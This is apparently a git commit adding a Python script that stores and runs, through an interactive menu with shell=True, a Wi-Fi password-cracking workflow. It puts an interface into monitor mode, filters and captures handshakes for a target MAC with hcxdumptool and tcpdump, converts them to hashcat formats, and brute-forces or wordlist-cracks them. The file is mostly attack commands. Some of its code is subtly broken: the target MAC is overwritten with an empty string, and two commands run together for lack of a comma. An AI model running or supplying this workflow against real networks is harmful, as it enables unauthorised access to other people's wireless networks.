46d392389ed1b4f3966dba911b9db0a09875ebc2
GeekSloth <84038443+geeksloth@users.noreply.github.com>
2025-03-22 20:34:36 +0700

    first commit

---
+++ main_v1.py
@@ -0,0 +1,236 @@
+import json
+import os
+import subprocess
+
+class JSONDatabase:
+    def __init__(self, file_path, session_name, interface, macaddress, channel, is_2GHz4):
+        self.file_path = file_path
+        self.session_name = session_name
+        self.interface = interface
+        self.macaddress = macaddress
+        self.macaddress = ""                    # e.g 18CF24852084
+        self.channel = channel
+        self.is_2GHz4 = is_2GHz4
+        if not os.path.exists(self.file_path):
+            self._create_empty_db()
+        
+
+    def _create_empty_db(self):
+        with open(self.file_path, 'w') as db_file:
+            json.dump([], db_file)
+
+    def _read_db(self):
+        with open(self.file_path, 'r') as db_file:
+            return json.load(db_file)
+
+    def _write_db(self, data):
+        with open(self.file_path, 'w') as db_file:
+            json.dump(data, db_file, indent=4)
+
+    def create(self, element):
+        data = self._read_db()
+        if element in data:
+            print("Element already exists in the database.")
+            return
+        data.append(element)
+        self._write_db(data)
+
+    def read(self, index):
+        data = self._read_db()
+        if 0 <= index < len(data):
+            return data[index]
+        else:
+            raise IndexError("Index out of range")
+
+    def update(self, index, new_element):
+        data = self._read_db()
+        if 0 <= index < len(data):
+            data[index] = new_element
+            self._write_db(data)
+        else:
+            raise IndexError("Index out of range")
+
+    def delete(self, index):
+        data = self._read_db()
+        if 0 <= index < len(data):
+            data.pop(index)
+            self._write_db(data)
+        else:
+            raise IndexError("Index out of range")
+
+    def list_all(self):
+        return self._read_db()
+
+
+    def prepare(self):  
+        self.create(
+            {
+                "step": 9,
+                "name": "Scan interfaces",
+                "commands": [
+                    "sudo iw dev",
+                    "iwconfig",
+                    "sudo airmon-ng",
+                    "sudo airmon-ng check kill",
+                ]
+            }
+        )  
+        self.create(
+            {
+                "step": 2,
+                "name": "Stop managing service",
+                "commands": [
+                    "sudo systemctl stop NetworkManager.service",
+                    "sudo systemctl stop wpa_supplicant.service"
+                ]
+            }
+        )
+        self.create(
+            {
+                "step": 3,
+                "name": "Put NIC into monitor mode",
+                "commands": [
+                    f"sudo airmon-ng start {self.interface}"
+                ]
+            }
+        )
+        self.create(
+            {
+                "step": 4,
+                "name": "Scan for networks",
+                "commands": [
+                    f"sudo airodump-ng {self.interface}"
+                ]
+            }
+        )
+        self.create(
+            {
+                "step": 5,
+                "name": "Create a BPF filter",
+                "commands": [
+                    f"sudo tcpdump -s 65535 -y IEEE802_11_RADIO 'wlan addr3 {self.macaddress} or wlan addr3 ffffffffffff' -ddd > {self.session_name}_attack.bpf"
+             ]
+            }
+        )
+        temp = ""
+        if self.is_2GHz4:
+            temp = f"{self.channel}a"
+        else:
+            temp = f"{self.channel}"
+        self.create(
+            {
+                "step": 6,
+                "name": "Start packet capture",
+                "commands": [
+                    f"sudo hcxdumptool -i {self.interface} -c {temp} --bpf={self.session_name}_attack.bpf -w {self.session_name}_capture.pcapng",
+                    f"sudo tcpdump -U -s 0 -i {self.interface} -w {self.session_name}_capture.pcap -l -n -e -vv -r {self.session_name}_attack.bpf"
+                ]
+            }
+        )
+        self.create(
+            {
+                "step": 7,
+                "name": "Convert captured packets to hashcat format",
+                "commands": [
+                    f"sudo hcxpcaptool -o {self.session_name}_hash.hc22000 {self.session_name}_capture.pcapng"
+                    f"sudo hcxpcaptool -z {self.session_name}_hash.16800 {self.session_name}_capture.pcapng"
+                ]
+            }
+        )
+        self.create(
+            {
+                "step": 8,
+                "name": "Crack captured hashes",
+                "commands": [
+                    f"hashcat.exe {self.session_name}_hash.hc22000 -a 3 -m 22000 -i --increment-min=8 --increment-max=12 ?d?d?d?d?d?d?d?d?d?d?d?d --session=1",
+                    f"sudo hashcat -m 22000 {self.session_name}_hash.hc22000 %d%d%d%d%d%d%d%d%d%d -a 3 --force",
+                    f"sudo hashcat -m 16800 {self.session_name}_hash.16800 /usr/share/wordlists/rockyou.txt"
+                ]
+            }
+        )
+        self.create(
+            {
+                "step": 1,
+                "name": "Restart managing service",
+                "commands": [
+                    "sudo systemctl start NetworkManager.service",
+                    "sudo systemctl start wpa_supplicant.service"
+                ]
+            }
+        )
+        self.create(
+            {
+                "step": 10,
+                "name": "Fix hcxdumptool error",
+                "commands": [
+                    "sudo apt-get update",
+                    "sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev",
+                    "git clone https://github.com/ZerBea/hcxtools.git",
+                    "cd hcxtools",
+                    "sudo make && sudo make install",
+                    "cd ..",
+                    "git clone https://github.com/Zerbea/hcxdumptool.git",
+                    "cd hcxdumptool",
+                    "sudo make && sudo make install",
+                    "which hcxdumptool"
+                ]
+            }
+        )
+
+    def flush(self):
+        self._create_empty_db()
+
+    def run_command(self, command):
+        try:
+            result = subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            return result.stdout.decode('utf-8')
+        except subprocess.CalledProcessError as e:
+            return e.stderr.decode('utf-8')
+
+    def menu_loop(self):
+        while True:
+            os.system('clear' if os.name == 'posix' else 'cls')
+            data = self._read_db()
+            data.sort(key=lambda x: x['step'])
+            for item in data:
+                print(f"{item['step']}: {item['name']}")
+            choice = input("Enter the step number to execute or 'q' to quit: ")
+            if choice.lower() == 'q':
+                break
+            try:
+                os.system('clear' if os.name == 'posix' else 'cls')
+                step = int(choice)
+                commands = next(item['commands'] for item in data if item['step'] == step)
+                for i, command in enumerate(commands):
+                    print(f"{i}: {command}")
+                cmd_choice = input("Enter the command number to execute or 'b' to go back: ")
+                if cmd_choice.lower() == 'b':
+                    continue
+                try:
+                    cmd_index = int(cmd_choice)
+                    if 0 <= cmd_index < len(commands):
+                        print(f"Executing: {commands[cmd_index]}")
+                        output = self.run_command(commands[cmd_index])
+                        print(output)
+                    else:
+                        print("Invalid command number.")
+                except ValueError:
+                    print("Invalid input.")
+            except (ValueError, StopIteration) as e:
+                print(f"Invalid choice: {e}")
+            input("Press Enter to continue...")
+
+
+db = JSONDatabase(
+    file_path='config.json',
+    session_name='ssid1',
+    interface='wlanX',
+    macaddress='aabbccddeeff',
+    channel='1',
+    is_2GHz4=True
+)
+db.flush()
+db.prepare()
+print(db.run_command("ls"))
+db.menu_loop()
+#print(config.list_all())
